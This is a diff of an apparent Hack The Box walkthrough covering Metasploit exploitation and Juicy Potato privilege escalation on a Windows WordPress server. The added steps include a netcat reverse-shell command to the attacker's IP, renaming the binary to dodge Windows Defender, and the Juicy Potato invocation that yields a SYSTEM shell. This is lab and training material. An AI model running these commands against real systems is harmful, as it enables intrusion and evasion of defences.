@@ -59,7 +59,7 @@ Step 2: msfconsole
     - `set RHOSTS 10.10.10.29`
     - `set LHOST < to your tun0 IP address >` (Forgot this and realized when it wasn't wokring)
       ![image](https://user-images.githubusercontent.com/29686845/134686497-8936a54b-69f9-4fcd-b98b-b7c4f8f300c4.png)
-    - We have all of our peramaters set now lets run the exploit. we can type `use` or `exploit` <-- the funniest one         of the two. 
+    - We have all of our peramaters set now lets run the exploit. we can type `run` or `exploit` <-- the funniest one         of the two. 
       ![image](https://user-images.githubusercontent.com/29686845/134688488-b5465433-988a-429f-966f-d0d8d2ce9f40.png)
     - Now we have our meterpreter connection and we can get a shell by typing `shell` 
       - shell can be a little finicky at times so we can work with it or we can upgrade our shell with netcat to               provide us with more stable shell.
@@ -93,4 +93,23 @@ Step 1: System Information
     - We see that we find that the os is Windows Server 2016 Standard, Version: 10.0.143393 Build 14383
 
 Step 2: Juicy Potato
-  - We are going to use a tool called [Juicy Potato](https://github.com/ohpe/juicy-potato.git). This is a varient of the tool [Rotton Potato](https://github.com/breenmachine/RottenPotatoNG). This allows services accounts to escalate to SYSTEM privilges by leveraging the [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal). Along with privileged access tokens in order to complete a [MiTM](https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/) attack. 
+  - We are going to use a tool called [Juicy Potato](https://github.com/ohpe/juicy-potato.git). This is a varient of       the tool [Rotton Potato](https://github.com/breenmachine/RottenPotatoNG). This allows services accounts to escalate     to SYSTEM privilges by leveraging the [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-           intelligent-transfer-service-portal). Along with privileged access tokens in order to complete a [MiTM]                 (https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/) or Man in the Middle attack. 
+    - now we need an exe file from the [Juicy Potato](https://github.com/ohpe/juicy-potato.git) git page.                     Unfrotuinatly, the exe we are looking for is not there and I have looked through all repositiores, but was             eventually found when you add /releases to the end of the github link. It should look like:
+    - `https://github.com/ohpe/juicy-potato/releases` 
+    - Download the file and make it executable with `chmod +x JuicyPotato.exe`
+    - Now lets upload it too the server.
+      ![image](https://user-images.githubusercontent.com/29686845/134717625-76ce60bc-8627-4f20-9cae-fafbedccaab0.png)
+    - We have to change the name of the file, so that when we run it windows defender wont flag it and kill the process
+    - to rename it use the move command `mv JuicyPotato.exe js.exe`
+    -  next lets run the start command and execute a powershell terminal.
+    -  `echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.14 1111 >                 shell.bat`
+    -  Lets set up another listener and call on the shell.bat file we just created.
+    -  `js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}`
+    -  now if you go over to your netcat listner we have a new administrator shell.
+
+# Post Exploitatoin
+
+Step 1: Exploring
+
+  - We start off in the system32 director in the windows server.... which we don'tt necessarily need so lets `cd \` to     get to our root directory.
+  - You will find our root.txt in `c:\Users\Administrator\Desktop`. We can cat the file to get the flag and input it       into hack the box.
